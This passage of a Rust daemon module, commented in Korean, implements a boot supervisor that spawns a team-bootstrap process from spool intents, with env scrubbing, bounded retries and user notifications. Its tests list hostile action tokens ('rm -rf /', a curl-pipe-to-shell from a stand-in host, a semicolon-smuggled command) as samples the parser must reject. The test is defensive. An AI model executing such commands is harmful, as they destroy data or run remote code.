    // 【무엇이 틀렸었는가】 아래 주입은 **조건부**인데, 조건이 거짓일 때 상속값을 지우지 않았다.
    // `tokio::process::Command` 는 기본이 부모(데몬) env 전량 상속이므로, 데몬 env 에 남은 값이
    // 그대로 자식에게 갔다. 도달 경로는 실재한다 — 훅은 `export CYS_DECL_ORIGIN="hook-human"`
    // 후 `javis_bootstrap.py` 를 spawn 하고(그 spawn 은 `CYS_NO_AUTOSTART` 를 걸지 않는다),
    // 체인 안의 `cys` 호출이 죽은 소켓을 만나면 cysd 를 낳는다. 그 cysd 는 `hook-human` 을
    // **데몬 수명 내내** 들고 있고, 그 뒤 `decl_origin` 이 빈 인텐트(=`decide()` 가 통과시키는
    // 형상)가 디스패치되면 자식은 기계유래 게이트를 통과한 적 없이 그 마커를 얻어
    // `javis_bootstrap._dept_fallback` 의 부서 자동 생성 봉인(폭주 봉인 ⓑ)을 무료로 연다.
    // `CYS_SEAT_TOKEN` 도 같은 형태로, mint 실패 강등 시 **타 pane 의 토큰**이 자식의
    // `cys claim-role` 에 실려 나간다(세대 접두가 맞으면 claim ⓒ 가 rc6 을 시끄럽게 낸다).
    // 【수리】 조건 판정 **전에** 무조건 지우고, 필요할 때만 다시 세운다 — 'withheld = absent'
    // 를 구조로 만든다(else 를 붙이는 것보다 갈래가 하나 적어 미래에 새는 자리가 없다).
    // `CYS_ROLE` 도 같은 자리에서 끊는다: 데몬이 pane 자손의 autostart 로 떴다면 그 pane 의
    // 역할(예: worker)을 상속하고, `_Log` 가 그것을 **master 부트의 boot-last `role` 필드**로
    // 적는다(§0-A 가 사실 원천으로 읽는 파일이 조용히 거짓이 된다). 감독자가 낳는 것은 항상
    // master 부트이므로 값을 명시한다.
    cmd.env_remove("CYS_DECL_ORIGIN")
        .env_remove(cys::ENV_SEAT_TOKEN)
        .env(cys::ENV_ROLE, "master");
    // ── (P2 · R3-P2-5) provenance·claim 주입 — 위 재실측이 참일 때만 ─────────────────────
    if let Some((sid, token)) = verified_claim {
        cmd.env("CYS_SURFACE_ID", sid.to_string())
            .env("CYS_CLAIM_RC", "0")
            .env("CYS_CLAIM_SID", sid.to_string())
            // 신선한 시각 = 지금(재실측 시각). 훅 스탬프 이월 금지 — _pre_bound 결박 창(300s)은
            // 이 값 기준으로 판정되므로, 이월하면 창 밖 디스패치가 전부 rc6 계급으로 떨어진다.
            .env("CYS_CLAIM_AT", format!("{}", now_epoch() as u64))
            .env("CYS_CLAIM_OUT", "[supervisor] registry re-verified");
        if !it.decl_origin.is_empty() {
            cmd.env("CYS_DECL_ORIGIN", &it.decl_origin);
        }
        if let Some(tok) = token {
            cmd.env(cys::ENV_SEAT_TOKEN, tok);
        }
    }
    {
        use crate::state::HideConsole;
        cmd.hide_console();
    }
    match std::fs::OpenOptions::new().create(true).append(true).open(&log) {
        Ok(f) => {
            if let Ok(e) = f.try_clone() {
                cmd.stderr(e);
            }
            cmd.stdout(f);
        }
        Err(_) => {
            cmd.stdout(std::process::Stdio::null())
                .stderr(std::process::Stdio::null());
        }
    }
    match cmd.spawn() {
        Ok(child) => {
            let pid = child.id().unwrap_or(0);
            // 핸들 즉시 드롭 = 기다리지 않는다(감독자 cadence 를 자식이 잡아먹지 않는다).
            // ★정직 명문(P2 · 2차 성찰 P2-3): 자식 exit 을 관측하지 않으므로 '스폰 성공=인텐트
            //   제거'이고, exit 11(싱글플라이트 skip)도 exit 10(session_error)도 여기서는
            //   '성공'으로 접힌다. 감독자의 **재시도 = 스폰 실패 한정**이며, 부트 실패 계급의
            //   재실행 주체는 §0-A(P0-3)가 유일하다 — 이 서술을 바꾸려면 exit 관측(비동기 wait)
            //   확장이 선행이다(이번 착지 범위 밖).
            drop(child);
            Ok(format!("pid={pid}"))
        }
        Err(e) => Err(RunErr::Retry(format!("스폰 실패: {e}"))),
    }
}

// ══════════════════════════════════════════════════════════════════════════════
// 틱
// ══════════════════════════════════════════════════════════════════════════════

/// 태스크 로컬 예산(id → (시도 수, 마지막 시도 시각)). **단일 writer**(감독자 태스크)이며,
/// watchdog 의 형제 맵들과 같은 규약으로 매 틱 솎인다.
///
/// ★설계서는 이 예산을 `Daemon` 필드로 승격해 watchdog 의 `restart_counts` 와 **공유**하라고
/// 요구한다. 그 승격은 `state.rs`·`governance.rs` 를 건드리므로 이 단위의 파일 반경 밖이다.
/// 그래서 이 착지는 **공유가 필요한 상황 자체를 만들지 않는 쪽**으로 안전을 확보한다:
/// 감독자는 좌석·에이전트를 **재기동하지 않는다**(kill·close·launch 호출 0 — 검체 소스 핀).
/// 감독자가 낳는 것은 부트 체인 하나뿐이고 그 예산은 여기서 유계다.
type Budget = HashMap<String, (u32, f64)>;

/// 감독자 태스크의 **로컬 상태 전량**(단일 writer). 예산 하나만 들고 다니던 것을 묶은 이유는
/// 유계 장치가 셋으로 늘었기 때문이다 — 셋이 서로를 무너뜨리지 않게 한 자리에서 본다.
#[derive(Default)]
struct SupState {
    /// 인텐트별 (시도 수, 마지막 시도 시각) — 메모리측 예산.
    budget: Budget,
    /// **음성 캐시** — 지우지 못한 (경로, 사유). 같은 키로는 이벤트를 두 번 내지 않는다.
    ///
    /// ★유계의 정의처(재난 ①): 삭제가 성공하면 그 항목은 다음 틱에 다시 오지 않으므로
    /// 이벤트는 1건이다. 삭제가 **실패하면** 같은 항목이 매 틱 같은 판정으로 다시 올라오므로,
    /// 여기서 (항목, 사유)당 **정확히 1건**으로 접는다. 회수는 **파일이 실제로 사라졌을 때만**
    /// 한다 — 나이로 만료시키면 '3초마다' 가 '5분마다' 로 바뀔 뿐 유계가 아니다.
    undeletable: std::collections::HashSet<(String, &'static str)>,
    /// 예산 포화를 이미 알렸는가(1회성 래치 — 포화가 지속되면 매 틱 알리는 것이 곧 폭주다).
    budget_pressure_reported: bool,
    /// GC 회전 커서(`scan_spool`).
    cursor: usize,
    /// (P2 · 오너 결정 ⑧c → R2 확장) **무스폰 loud 통보 래치** — 인텐트 id 당 정확히 1회.
    ///
    /// 무스폰 종착은 여러 지점에서 관측된다(dispatch 실패 3회째 · `attempts_exhausted` 폐기 ·
    /// `claim_stale`/`no_surface`/`expired`/스키마·토큰 폐기) — 삭제 실패로 인텐트가 스풀에
    /// 남으면 같은 인텐트가 여러 지점을 다 지나므로, 래치 없이는 통보가 중복된다. 회수는
    /// 스풀에서 사라진 id 만(재선언은 선언별 유일 id 라 새 키다), 상한은 [`MAX_UNDELETABLE`]
    /// 재사용(넘치면 새 키에 침묵 — 유계가 통보보다 앞이다. 다만 그 침묵은 아래
    /// `notify_capped_reported` 로 **1회 가청화**한다 — R2 note).
    no_spawn_notified: std::collections::HashSet<String>,
    /// (R2 note) 통보 래치 상한 도달을 이미 알렸는가 — 1회성(`budget_pressure_reported` 동형).
    notify_capped_reported: bool,
}

/// 스풀 항목 1건을 지우고 **이벤트를 내도 되는지**를 함께 판정한다.
///
/// 반환 `Some(removed)` = 지금 발행하라(값은 실제 삭제 여부) · `None` = 이미 알린 사실이다.
/// 종전 코드는 `let _ = remove_file(..)` 뒤에 **무조건** 발행했다 — 지워지지 않는 항목 하나가
/// 감독자 cadence(3초)마다 영구히 이벤트를 낸다(재난 ①). Windows 가 주 경로다: 읽기전용
/// 속성·다른 프로세스가 연 파일에서 `remove_file` 이 실패하고, `ensure_spool` 의 권한
/// 재강제는 `#[cfg(unix)]` 라 거기서는 아무 것도 고치지 않는다.
fn remove_and_gate(
    st: &mut SupState,
    remover: Remover,
    p: &Path,
    why: &'static str,
) -> Option<bool> {
    let key = (p.to_string_lossy().into_owned(), why);
    if remover(p) {
        st.undeletable.remove(&key);
        return Some(true);
    }
    // 이미 알렸다 · 캐시가 찼다 → **침묵**. 캐시를 비우는 것은 폭주를 다시 여는 것과 같다.
    if st.undeletable.contains(&key) || st.undeletable.len() >= MAX_UNDELETABLE {
        return None;
    }
    st.undeletable.insert(key);
    Some(false)
}

/// 무스폰 사유의 **사람이 읽는 문면**. 닫힌 집합이며 미지 사유는 일반 문안으로 접힌다
/// (`decide`·`RunErr` 가 낳는 토큰 전량이 여기 등재된다 — 새 토큰을 추가하면 여기도 함께).
fn no_spawn_reason(why: &str) -> &'static str {
    match why {
        "attempts_exhausted" | "dispatch_failed" => "스폰이 예산(3회)까지 전부 실패했다",
        "claim_stale" => "선언 좌석이 더 이상 master 가 아니다(좌석 종료·인계) — 남은 재시도도 같은 판정이라 정지했다",
        "no_surface" => "인텐트에 선언 좌석이 없다(스풀 직접 투하 의심) — 스폰하지 않았다",
        "expired" => "인텐트가 수명(30분)을 넘겼다(kill-switch pause 지속 등) — 지금 팀을 띄우는 것은 오너가 기대한 인과가 아니라 폐기했다",
        "schema_mismatch" => "인텐트 스키마가 이 데몬과 다르다(팩·데몬 다운그레이드 스큐)",
        "unknown_action" | "unknown_decl_origin" => "인텐트가 인정되지 않는 토큰을 날랐다(닫힌 집합 밖) — 실행하지 않고 폐기했다",
        _ => "부트 감독자가 이 선언으로 팀을 띄우지 못했다",
    }
}

/// (P2 · 오너 결정 ⑧c → ★R2 확장) **무스폰 loud 종착** — "버스 이벤트만"은 마스터가 아직
/// 태어나지 않은 시점의 방송이라 청중이 0 인 조용한 포기다(WDSI 좀비 18회의 교훈: 정지 조건 +
/// **가시성**). 채널 3개: ①기존 버스 이벤트(호출부의 `dispatch_failed`/`intent_retired` —
/// 여기서 내지 않는다) ②데몬 내부 feed 항목(kind=`bootstrap-fail` — 훅 `_notify_bg` 와 동일
/// 분류) ③선언 surface 생존 시 **원장 선기록 후** 1줄 정직 통보.
///
/// ## ★트리거 재정의(R2 must_fix · 2026-08-26) — '예산 소진' 이 아니라 '스폰 0회'
/// 종전 호출부는 `attempts_exhausted`·`dispatch_failed` **둘뿐**이었다. 그런데 P2 frontdoor 는
/// 훅이 스폰하지 않고 exit 0 한 뒤 모델에게 "곧 스폰하고 … 소진 시 이 화면과 승인 Feed 로
/// 통보한다" 고 **약속**한다(`hooks/role-bootstrap.sh` frontdoor note). `claim_stale`·
/// `no_surface`·`expired`·`schema_mismatch`·`unknown_action`·`unknown_decl_origin` 은 그
/// 약속을 지키지 않고 팀 0노드로 끝났다 — boot-last 기록도 없어 §0-A session_error 행(P0-3)의
/// 근거조차 생기지 않으므로 사용자 관측은 정확히 '선언했는데 무반응'이다. 그래서 트리거를
/// **"이 인텐트는 스폰 0회로 끝났다"** 로 옮기고 사유 문안만 분기한다(`no_spawn_reason`).
/// 유계는 그대로다 — 래치 키는 인텐트 id 이므로 **인텐트당 1회**이고, 호출부는 틱당 통보
/// 예산(`MAX_RETIRE_NOTIFY_PER_TICK`)을 따로 집행한다.
///
/// ★③에 `cfg!(unix)` 게이트를 걸지 않는다(`announce_seat_takeover` 와 **다른** 신규 경로):
///   통보의 주 청중이 정확히 Windows 다(setsid 부재 계급) — 같은 게이트를 답습하면 정확히
///   필요한 곳에서 침묵한다(2차 성찰 P2-3). 저 함수의 `#` 주석 접두도 쓰지 않는다 —
///   여기의 대상은 빈 셸 좌석이 아니라 선언 pane(Claude 세션)이고, 기계 push 오인은 원장
///   선기록(`Origin::Supervisor`)이 이미 봉인한다(delivery.rs 불변식 ①).
///
/// `pane_budget` = 이번 틱에 **pane 주입**이 몇 건 더 허용되는가(호출부가 소유·감소시킨다).
/// feed 항목과 버스 이벤트는 이 예산과 무관하게 나간다 — 잘리는 것은 홍수 채널 하나뿐이다.
fn notify_no_spawn(
    daemon: &Arc<Daemon>,
    st: &mut SupState,
    it: &BootIntent,
    why: &str,
    pane_budget: &mut usize,
) {
    if st.no_spawn_notified.contains(&it.id) {
        return;
    }
    if st.no_spawn_notified.len() >= MAX_UNDELETABLE {
        notify_capped_once(daemon, st, "latch_full", why);
        return;
    }
    st.no_spawn_notified.insert(it.id.clone());
    let text = format!(
        "[cys-supervisor] 팀이 이 선언으로 뜨지 않았다(intent={} why={why}) — {}. 재선언이 재개 신호다. 근거: boot-supervisor.log · boot-last",
        it.id,
        no_spawn_reason(why)
    );
    // ★feed 는 **무조건**이다 — '조용히 사라지는 갈래 0' 의 하한선.
    daemon.push_feed_notification("bootstrap-fail", "부트 감독자 무산(팀 미기동)", &text, it.surface_id);
    // pane 주입만 틱 예산에 걸린다(홍수 방지). 잘려도 feed·이벤트가 사실을 이미 남겼다.
    if *pane_budget == 0 {
        notify_capped_once(daemon, st, "pane_per_tick", why);
        return;
    }
    *pane_budget -= 1;
    if let Some(sid) = it.surface_id {
        if let Some(s) = daemon.get_surface(sid) {
            if !s.exited.load(Ordering::Relaxed) {
                // ★원장 선기록이 주입보다 앞(delivery.rs 불변식 ① — dispatch_one 과 같은 순서).
                crate::delivery::record_audited(
                    daemon,
                    sid,
                    &text,
                    crate::delivery::Origin::Supervisor,
                    None,
                );
                // try_send: 채널 포화면 조용히 포기 — 통보는 best-effort 이고 feed·이벤트가
                // 이미 사실을 남겼다(고지 실패가 유계를 흔들면 안 된다).
                let _ = s.write_tx.try_send(crate::state::WriteReq::Inject {
                    text,
                    cr_delay_ms: 120,
                    clear_first: false,
                });
            }
        }
    }
}

/// (★R2 note) 통보가 **유계로 잘렸다**는 사실의 1회성 가청화(`budget_pressure_reported` 동형).
///
/// 유계가 통보보다 앞이라는 절충은 유지하되, 이 파일의 다른 유계 방어(`undeletable`·
/// `budget_pressure`)가 전부 최소 1건의 이벤트를 남기는데 통보 절단만 아무 흔적이 없던
/// 비대칭을 없앤다 — 256건 동시 무산은 이미 병리 상태이고, 정확히 그 순간 침묵하면 안 된다.
fn notify_capped_once(daemon: &Arc<Daemon>, st: &mut SupState, kind: &str, why: &str) {
    if st.notify_capped_reported {
        return;
    }
    st.notify_capped_reported = true;
    publish(
        daemon,
        "boot_supervisor.notify_capped",
        json!({"kind": kind, "why": why,
               "latch_cap": MAX_UNDELETABLE, "pane_cap_per_tick": MAX_RETIRE_NOTIFY_PER_TICK,
               "note": "무스폰 통보가 유계로 잘린다(feed·이벤트는 계속 나간다)"}),
    );
}

/// 한 틱. 디스크 I/O + (있으면) 실행. **동기**이며 호출자가 `catch_unwind` 로 감싼다.
/// 반환값은 이번 틱의 디스패치 횟수(테스트가 유계성을 세는 축).
fn tick_in(
    daemon: &Arc<Daemon>,
    dir: &Path,
    st: &mut SupState,
    runner: Runner,
    remover: Remover,
    now: f64,
) -> usize {
    // ★(P2 · R3-RISK-1) kill-switch 게이트 — pause 중에는 낳지도 지우지도 않는다
    //   (schedule.rs `scheduler_tick` 선두 게이트와 동형). 오너의 어떤 입력이든 kill-switch 를
    //   눌렀다는 뜻이고, 그 순간 기계가 새 프로세스를 낳는 것이 정확히 pause 가 막으려는 것이다.
    if daemon.paused.load(Ordering::Relaxed) {
        return 0;
    }
    // ★스풀 권한 **재강제**(unix 0o700) — 있을 때만. 없으면 **만들지 않는다**:
    //   감독자는 관측자이지 생산자가 아니고, 스풀 생성은 인텐트를 적는 쪽의 일이다.
    //   ★현행 사실(R2 · 2026-08-26 정정): 정상 경로의 **유일한 writer 는 데몬 자신**이다
    //   (`boot.enqueue`→`write_intent`→`ensure_spool` — 0700/0600 원자 기록). 종전 주석은
    //   '지금 생산자가 없다 = 디스크 자국 0' 과 '생산자가 셸이면(U-24) umask 로 넓어진다'를
    //   근거로 들었는데 둘 다 이 캠페인으로 낡았다(셸 생산자는 존재하지 않는다).
    //   그래서 이 재강제는 **잔여 방어**다: 구 릴리스가 남긴 스풀·수동 조작·복원 도구가
    //   넓혀 놓은 권한을 데몬이 만날 수 있고, 그때 이 한 줄이 없으면 스풀은 한 번도 조여지지
    //   않은 채로 남는다. 정상 경로에서는 아무 것도 바꾸지 않는 잉여이며 그 사실이 의도다.
    if dir.exists() {
        let _ = ensure_spool(dir);
    }
    let scan = scan_spool(dir, now, st.cursor);
    st.cursor = scan.next_cursor;
    // 음성 캐시 회수 — 파일이 실제로 사라진 키만 버린다(위 필드 주석의 '나이 만료 금지').
    st.undeletable.retain(|(p, _)| Path::new(p).exists());
    // 무스폰 통보 래치 회수 — 스풀에서 사라진 id 만(재선언은 선언별 유일 id 라 어차피 새 키다).
    st.no_spawn_notified.retain(|id| scan.present.contains(id));

    // ── 디스크 GC(파싱 불가·mtime 초과) ────────────────────────────────────────
    for (p, why) in &scan.garbage {
        if let Some(removed) = remove_and_gate(st, remover, p, why) {
            publish(
                daemon,
                "boot_supervisor.intent_discarded",
                json!({"path": p.to_string_lossy(), "why": why, "removed": removed}),
            );
        }
    }

    // ── 맵 3종 방어 ────────────────────────────────────────────────────────────
    // ② 나이 만료 — 스풀에서 사라졌어도 예산은 수명만큼 기억한다(즉시 재등록으로 예산을
    //    리셋하는 우회 차단). ③ 매 틱 retain 은 아래 캡 뒤가 아니라 여기서 함께 본다.
    st.budget
        .retain(|id, (_, last)| now - *last <= INTENT_MAX_AGE_SECS || scan.present.contains(id));
    // ① 상한 — ★`clear()` 하지 않는다(결함 2a 수리).
    //   종전 주석은 "비워도 디스크측 예산이 남아 상한을 계속 집행한다" 고 했다. 그러나 두 축을
    //   **함께 둔 근거 자체**가 '읽기전용 스풀·디스크 만실에서 attempts 가 영원히 0' 인
    //   상황이다 — 바로 그 상황에서 clear 가 일어나면 두 축이 **동시에** 무너져 인텐트당
    //   3회 상한이 무력화된다(매 틱 프로세스 1개 = 폭주). 그래서 상한 집행은:
    //     ⓐ **스풀에 없는** 항목만, 오래된 것부터 솎는다(LRU — 살아있는 예산은 건드리지 않는다).
    //     ⓑ 그래도 넘치면(= 실재하는 인텐트만으로 상한 초과) **낳는 것을 멈춘다**.
    //        살아있는 예산을 버려 맵 크기를 지키는 것은 유계를 파는 것이다 — 그럴 바엔 낳지 않는다.
    //        멈춰도 스풀은 GC·Retire 로 계속 줄어들므로 이 상태는 스스로 풀린다.
    let mut suspend_dispatch = false;
    if st.budget.len() > MAX_TRACKED {
        let over = st.budget.len() - MAX_TRACKED;
        let mut evictable: Vec<(f64, String)> = st
            .budget
            .iter()
            .filter(|(id, _)| !scan.present.contains(*id))
            .map(|(id, (_, last))| (*last, id.clone()))
            .collect();
        evictable.sort_by(|a, b| a.0.total_cmp(&b.0));
        let evicted = evictable.len().min(over);
        for (_, id) in evictable.into_iter().take(over) {
            st.budget.remove(&id);
        }
        suspend_dispatch = st.budget.len() > MAX_TRACKED;
        if !st.budget_pressure_reported {
            st.budget_pressure_reported = true;
            publish(
                daemon,
                "boot_supervisor.budget_pressure",
                json!({"entries": st.budget.len(), "evicted": evicted, "cap": MAX_TRACKED,
                       "dispatch_suspended": suspend_dispatch}),
            );
        }
    }

    // ── 판정·실행 ──────────────────────────────────────────────────────────────
    let mut dispatched = 0usize;
    // ★(R2 must_fix) 무스폰 통보의 **pane 주입 틱 예산**. 폐기는 스캔 상한(64)까지 갈 수
    //   있으므로 pause 회복 직후처럼 다수가 한꺼번에 `expired` 로 접히는 순간에 선언 pane 이
    //   주입 홍수를 맞는 것을 막는다. feed·이벤트는 이 예산과 무관하게 나가고, 폐기(삭제)도
    //   무관하게 계속한다 — 잘리는 것은 홍수 채널 하나뿐이다.
    let mut pane_notices = MAX_RETIRE_NOTIFY_PER_TICK;
    for it in &scan.intents {
        if dispatched >= MAX_DISPATCH_PER_TICK {
            break;
        }
        let (mem_attempts, mem_last) = st.budget.get(&it.id).copied().unwrap_or((0, 0.0));
        let attempts = effective_attempts(it.attempts, mem_attempts);
        // ★메모리측 쿨다운 — 디스크에 `next_attempt_at` 이 적히지 못했어도(읽기전용 스풀)
        //   같은 인텐트를 쿨다운 안에 다시 낳지 않는다(폭주 차단 ③).
        if mem_attempts > 0 && now < backoff_until(mem_attempts, mem_last) {
            continue;
        }
        match decide(it, attempts, now) {
            Disposition::Wait { .. } => {}
            Disposition::Retire(why) => {
                // ★(R2 must_fix) **스폰 0회 종착은 전부 loud 다** — 종전엔 `attempts_exhausted`
                //   하나만 통보하고 claim_stale·no_surface·expired·schema_mismatch·
                //   unknown_action·unknown_decl_origin 은 버스 이벤트만 낸 채 사라졌다.
                //   frontdoor note 가 모델에게 '곧 스폰한다 · 소진 시 통보한다'고 약속한 뒤
                //   훅이 exit 0 한 경로에서는 그 침묵이 곧 '선언했는데 무반응'이다.
                //   통보가 **삭제보다 앞**이다 — 순서가 뒤집히면 삭제 실패 게이트(음성 캐시)의
                //   조용한 분기가 통보까지 삼킬 여지가 생긴다.
                notify_no_spawn(daemon, st, it, why, &mut pane_notices);
                // 폐기는 통보 예산·삭제 실패와 무관하게 계속한다 — 스풀을 줄이는 방향이고,
                // 쓰레기·적대 인텐트의 GC 를 통보 예산에 묶으면 스풀이 줄지 않는다.
                if let Some(removed) =
                    remove_and_gate(st, remover, &intent_path(dir, &it.id), why)
                {
                    publish(
                        daemon,
                        "boot_supervisor.intent_retired",
                        json!({"id": it.id, "action": it.action_token, "why": why,
                               "attempts": attempts, "removed": removed}),
                    );
                }
            }
            Disposition::Run(action) => {
                if suspend_dispatch {
                    continue; // 예산 포화 — 유계가 우선이다(낳지 않는다).
                }
                dispatched += 1;
                let next = attempts + 1;
                st.budget.insert(it.id.clone(), (next, now));
                // 디스크측 예산 선기록 — 실행 **전**에 올려 둬야 이 사이에 데몬이 죽어도
                // 다음 세대가 시도 수를 잃지 않는다(예산의 안전 방향 = 과소가 아니라 과다).
                let mut persisted = it.clone();
                persisted.attempts = next;
                persisted.next_attempt_at = backoff_until(next, now);
                let persist_err = write_intent(dir, &persisted).err();
                let outcome = dispatch_one(daemon, it, action, runner);
                match outcome {
                    Ok(detail) => {
                        let removed = remover(&intent_path(dir, &it.id));
                        publish(
                            daemon,
                            "boot_supervisor.dispatched",
                            json!({"id": it.id, "action": action.as_str(),
                                   "attempt": next, "detail": detail, "removed": removed,
                                   "persist_error": persist_err}),
                        );
                    }
                    // (P2 · R3-P2-5) 전제 붕괴(claim_stale) — 재시도가 아니라 **폐기**다.
                    // 좌석이 죽어 레지스트리에서 master 가 사라졌다면 남은 2회 재시도도 같은
                    // 판정으로 전소할 뿐이다 — 정직한 정지(오너 재선언 = 재개 신호·무스폰).
                    // ★(R2 must_fix) 실행자가 스폰 **전에** 접은 종착(claim_stale·no_surface)도
                    //   스폰 0회다 — 위 Disposition::Retire 와 같은 계급으로 loud 다. 여기는
                    //   MAX_DISPATCH_PER_TICK 이 이미 틱당 2건으로 유계라 별도 통보 예산을
                    //   두지 않는다(래치가 인텐트당 1회를 마저 집행한다).
                    Err(RunErr::Retire(why)) => {
                        notify_no_spawn(daemon, st, it, why, &mut pane_notices);
                        if let Some(removed) =
                            remove_and_gate(st, remover, &intent_path(dir, &it.id), why)
                        {
                            publish(
                                daemon,
                                "boot_supervisor.intent_retired",
                                json!({"id": it.id, "action": action.as_str(), "why": why,
                                       "attempt": next, "removed": removed,
                                       "persist_error": persist_err}),
                            );
                        }
                    }
                    Err(RunErr::Retry(why)) => {
                        if next >= MAX_ATTEMPTS {
                            let _ = remover(&intent_path(dir, &it.id));
                        }
                        publish(
                            daemon,
                            "boot_supervisor.dispatch_failed",
                            json!({"id": it.id, "action": action.as_str(),
                                   "attempt": next, "max": MAX_ATTEMPTS, "why": why,
                                   "persist_error": persist_err}),
                        );
                        // (P2 · 오너 결정 ⑧c) 마지막 시도까지 스폰이 실패했다 — loud 종착.
                        if next >= MAX_ATTEMPTS {
                            notify_no_spawn(daemon, st, it, "dispatch_failed", &mut pane_notices);
                        }
                    }
                }
            }
        }
    }
    dispatched
}

fn publish(daemon: &Arc<Daemon>, name: &str, payload: serde_json::Value) {
    daemon.bus.publish(name, "boot_supervisor", None, payload);
}

/// 감독자 기동 — **별도 `tokio::spawn` + 자기 cadence**.
///
/// watchdog 틱 안에 두면 부트 1회가 큐 배달·승인 격상·데드맨·회수를 수십 초 정지시킨다
/// (모듈 헤더 'watchdog 틱을 절대 막지 않는다' 절). 이 함수가 `governance` 가 아니라 여기
/// 있는 것 자체가 그 계약의 구조적 표현이다.
pub fn spawn(daemon: Arc<Daemon>) {
    let off = supervisor_off_from(
        std::env::var(cys::ENV_BOOT_GATES).ok().as_deref(),
        std::env::var(ENV_SUPERVISOR).ok().as_deref(),
    );
    if off {
        eprintln!("[cysd] boot-supervisor disabled (CYS_BOOT_GATES=0 또는 CYS_BOOT_SUPERVISOR=0)");
        return;
    }
    // ★(P2 · R3-P2-4 blocker) 생존 플래그 — 태스크 기동 **직전**에만 set 한다. 꺼짐(off)이면
    //   위에서 이미 return 했으므로 영영 미set 이고, `boot.enqueue` arm 은 미set 을 보고 스풀에
    //   쓰지 않는다('등록 성공·발화자 0' 무음 스큐의 봉인 — Daemon::supervisor_alive 주석 정본).
    daemon.supervisor_alive.store(true, Ordering::SeqCst);
    tokio::spawn(async move {
        let dir = spool_dir(&daemon.socket_path);
        let mut st = SupState::default();
        loop {
            tokio::time::sleep(Duration::from_secs(SUPERVISOR_INTERVAL_SECS)).await;
            // 패닉 격리 — watchdog 과 같은 규약. 한 틱의 패닉이 감독자를 데몬 수명 내내
            // 조용히 없애면, 그것이 곧 '감독자 없음'(R3) 으로의 회귀다.
            let body = std::panic::AssertUnwindSafe(|| {
                tick_in(
                    &daemon,
                    &dir,
                    &mut st,
                    run_ensure_team,
                    remove_spool_file,
                    now_epoch(),
                );
            });
            if std::panic::catch_unwind(body).is_err() {
                publish(
                    &daemon,
                    "boot_supervisor.tick_panic",
                    json!({"note": "boot supervisor tick panicked; continuing next tick"}),
                );
            }
        }
    });
}

// ══════════════════════════════════════════════════════════════════════════════
#[cfg(test)]
mod tests {
    use super::*;

    /// 실 프로세스를 낳지 않는 실행자 — 항상 성공.
    /// 검체용 인텐트 — v3 필드까지 채운 기본형. 리터럴을 검체마다 두면 필드가 늘 때마다
    /// 전부 고쳐야 하고, 그 수선이 곧 "이 검체가 무엇을 재는지" 를 흐린다.
    fn intent(id: &str) -> BootIntent {
        BootIntent {
            id: id.into(), v: INTENT_SCHEMA_V, action_token: "ensure-team".into(),
            lane: String::new(), surface_id: None, created_at: 1000.0, attempts: 0,
            next_attempt_at: 0.0, reason: String::new(), decl_origin: String::new(),
            claim_rc: None, claim_at: None,
            decl_id: id.into(), executor: EXECUTOR_RUNNER.into(), generation: 0,
            state: IntentState::Pending, terminal: None,
        }
    }

    /// 검체용 enqueue 요청 — 좌석 축만 바꿔 가며 쓴다.
    fn req<'a>(decl_id: &'a str, surface_id: Option<u64>) -> EnqueueReq<'a> {
        EnqueueReq {
            decl_id, action: BootAction::EnsureTeam, lane: "", surface_id,
            reason: "t", decl_origin: "", claim_rc: None, claim_at: None,
            executor: EXECUTOR_RUNNER,
        }
    }

    fn ok_runner(_d: &Arc<Daemon>, _i: &BootIntent, _a: BootAction) -> Result<String, RunErr> {
        Ok("test-ok".to_string())
    }
    /// 항상 실패하는 실행자(유계성 시험용 — 재시도 계급).
    fn fail_runner(_d: &Arc<Daemon>, _i: &BootIntent, _a: BootAction) -> Result<String, RunErr> {
        Err(RunErr::Retry("test-fail".to_string()))
    }
    /// (P2 · R3-P2-5) 전제 붕괴 계급 실행자 — claim_stale 폐기 경로 시험용.
    fn stale_runner(_d: &Arc<Daemon>, _i: &BootIntent, _a: BootAction) -> Result<String, RunErr> {
        Err(RunErr::Retire("claim_stale"))
    }

    /// **절대 지우지 못하는** 제거자 — Windows 읽기전용 속성·백신/생산자 셸이 연 파일을 모사.
    /// 이 표본이 결정론이어야 "지워지지 않아도 이벤트는 유계" 를 기계로 증명할 수 있다.
    fn never_removes(_p: &Path) -> bool {
        false
    }

    fn tmp_daemon(tag: &str) -> Arc<Daemon> {
        crate::delivery::tests::isolate_state_dir_for_thread(tag);
        let dir = std::env::temp_dir().join(format!("cys_bsup_{}_{}", std::process::id(), tag));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).unwrap();
        Daemon::new(dir.join("cysd.sock"))
    }

    fn tmp_spool(tag: &str) -> PathBuf {
        let d = std::env::temp_dir().join(format!("cys_bsup_spool_{}_{}", std::process::id(), tag));
        let _ = std::fs::remove_dir_all(&d);
        std::fs::create_dir_all(&d).unwrap();
        d
    }

    fn raw_intent(dir: &Path, id: &str, body: &str) {
        std::fs::write(dir.join(format!("{id}.json")), body).unwrap();
    }

    // ── 순수 코어 진리표 ───────────────────────────────────────────────────────

    /// 롤백 스위치는 **마스터에 접혀 있다** — 축 노브 없이 마스터만으로 꺼져야 한다.
    #[test]
    fn rollback_folds_into_master_switch() {
        assert!(!supervisor_off_from(None, None), "기본은 켜짐(종전 동작=빈 스풀)");
        assert!(supervisor_off_from(Some("0"), None), "마스터 하나로 꺼져야 한다");
        assert!(supervisor_off_from(None, Some("0")), "축 노브도 끈다");
        assert!(supervisor_off_from(Some("0"), Some("1")), "마스터가 축을 이긴다");
        // 느슨한 truthy 를 받아주지 않는다(오타 하나로 안전장치가 뒤집히지 않게).
        assert!(!supervisor_off_from(Some("false"), Some("no")), "엄격 비교");
        assert_eq!(cys::ENV_BOOT_GATES, "CYS_BOOT_GATES");
        assert_eq!(ENV_SUPERVISOR, "CYS_BOOT_SUPERVISOR");
    }

    /// 인텐트가 나르는 것은 **닫힌 enum 토큰**이다 — 명령 문자열은 실행되지 않는다.
    #[test]
    fn unknown_action_token_is_never_executed() {
        assert_eq!(BootAction::parse("ensure-team"), Some(BootAction::EnsureTeam));
        // ★합성 표본 — 이것들이 하나라도 `Some` 이 되면 스풀이 명령 실행 표면이 된다.
        for hostile in [
            "rm -rf /",
            "sh -c 'curl evil|sh'",
            "ensure-team; rm -rf /",
            "EnsureTeam",
            "",
            "ensure_team",
        ] {
            assert_eq!(BootAction::parse(hostile), None, "미지 토큰이 통과했다: {hostile:?}");
            let mut it = intent("x");
            it.action_token = hostile.into();
            it.created_at = 100.0;
            assert_eq!(
                decide(&it, 0, 100.0),
                Disposition::Retire("unknown_action"),
